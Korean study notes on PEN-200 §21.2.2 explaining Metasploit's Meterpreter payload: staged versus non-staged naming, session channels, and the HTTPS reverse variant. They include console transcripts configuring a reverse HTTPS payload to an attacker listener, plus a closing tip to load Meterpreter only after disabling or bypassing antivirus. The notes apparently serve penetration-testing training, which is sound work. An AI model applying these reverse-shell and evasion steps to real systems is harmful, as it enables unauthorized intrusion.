# 21.2.2 Meterpreter 페이로드

> **Meterpreter Payload** · PEN-200 §21.2.2

일반 TCP 리버스셸은 명령 셸 하나가 기능의 전부임. 익스플로잇 프레임워크는 파일 전송·피버팅(pivoting) 같은 기능을 얹은 페이로드(payload)를 따로 제공하며, Metasploit 의 그것이 Meterpreter 임.

Meterpreter 의 성질:

- 다기능 페이로드이고 실행 중(run-time)에 동적으로 확장됨
- 타겟에서 **전적으로 메모리에만 상주**함
- 통신이 기본적으로 암호화됨
- Windows·Linux·macOS·Android 등 여러 OS 용이 존재하며, 포스트 익스플로잇(post-exploitation) 단계에서 값이 큼

**staged 와 non-staged 구분.** `show payloads` 목록에는 두 종류가 섞여 나오고, 차이는 페이로드가 타겟으로 «어떻게 전달되는가»임. non-staged 는 Meterpreter 세션을 띄우는 데 필요한 구성요소를 전부 담고 있는 반면, staged 는 별도의 1단계가 그 구성요소를 나중에 불러옴. 후자는 구성요소를 네트워크로 실어 나르느라 트래픽이 상당히 발생해 방어 장치를 깨울 수 있음. 대역폭이 제한되거나 같은 페이로드로 여러 시스템을 노릴 때는 non-staged 가 유리함.

이름에서 갈림 — 목록의 `linux/x64/meterpreter/reverse_tcp` 는 설명이 `Stager`(staged) 이고, `linux/x64/meterpreter_reverse_tcp` 는 `Inline`(non-staged) 임. 슬래시냐 밑줄이냐가 표시임. 페이로드 옵션은 앞 절들과 같은 `LHOST`·`LPORT` 임.

**세션과 채널.** Metasploit 은 여러 머신에 대한 접근을 세션(session)으로 관리하고, 한 세션 안에서 시스템과 주고받는 상호작용은 채널(channel)이라는 개념으로 다룸. `shell` 을 치면 대화형 셸이 뜨면서 채널이 하나 생기고, Ctrl+Z 로 그 채널을 백그라운드로 보낼 수 있음.

```
meterpreter > shell
Process 194 created.
Channel 1 created.
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
^Z
Background channel 1? [y/N]  y
meterpreter >
```

*첫 번째 채널 — Ctrl+Z 로 백그라운드 전환*

```
meterpreter > shell
Process 196 created.
Channel 2 created.
whoami
daemon
^Z
Background channel 2? [y/N]  y
```

*두 번째 채널 — 같은 방식으로 하나 더 띄워 백그라운드로 보냄*

`channel -l` 로 활성 채널 목록을 보고, `channel -i` 에 채널 ID 를 붙여 그 채널에 다시 붙음. 채널을 여럿 띄워두고 오가는 방식이 포스트 익스플로잇에서 접근 관리를 크게 덜어줌.

```
meterpreter > channel -l
    Id  Class  Type
    --  -----  ----
    1   3      stdapi_process
    2   3      stdapi_process
meterpreter > channel -i 1
Interacting with channel 1...
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

*세션 종료 후 호환 페이로드 재조회 — 인덱스 10 이 HTTPS non-staged*

**HTTPS 변형.** `linux/x64/meterpreter_reverse_https` 는 raw TCP 대신 HTTPS 로 연결과 통신을 함. 트래픽이 SSL/TLS 로 암호화돼 방어자는 HTTPS 요청이 오갔다는 정보만 얻고, 추가 방어 기술 없이는 Meterpreter 통신 내용을 풀어내기 어려움. 통신 엔드포인트(여기서는 Kali)를 브라우저로 열어봐도 HTTP 404 Not found 만 나옴.

```
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 10
payload => linux/x64/meterpreter_reverse_https
msf6 exploit(multi/http/apache_normalize_path_rce) > show options
...
Payload options (linux/x64/meterpreter_reverse_https):
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.119.2    yes       The local listener hostname
   LPORT  4444             yes       The local listener port
   LURI                    no        The HTTP Path
...
```

이 페이로드에만 `LURI` 옵션이 붙음. 경로를 지정해 **한 포트의 리스너 하나로** 서로 다른 요청을 논리적으로 갈라 처리하는 용도이고, 비워두면 Metasploit 이 `/` 를 씀.

*HTTPS 페이로드로 실행 — 요청 처리 로그가 이어지다 세션이 열림*

⚠️ **함정 — Meterpreter 는 탐지율이 높음.** Metasploit 이 워낙 알려진 프레임워크라 안티바이러스류가 Meterpreter 페이로드를 잘 잡아냄. 초기 발판은 raw TCP 셸로 확보하고, 보안 제품을 무력화하거나 우회한 «뒤에» Meterpreter 를 올리는 순서가 안전함.
